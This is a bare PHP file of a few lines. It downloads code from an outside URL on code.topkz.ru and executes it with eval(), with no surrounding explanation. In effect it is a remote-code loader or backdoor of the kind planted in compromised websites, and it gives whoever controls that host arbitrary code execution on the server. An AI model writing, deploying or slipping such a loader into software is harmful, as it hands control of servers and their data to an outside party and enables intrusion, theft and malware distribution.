<?php
$path = "https://code.topkz.ru/fgd/8/zi.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
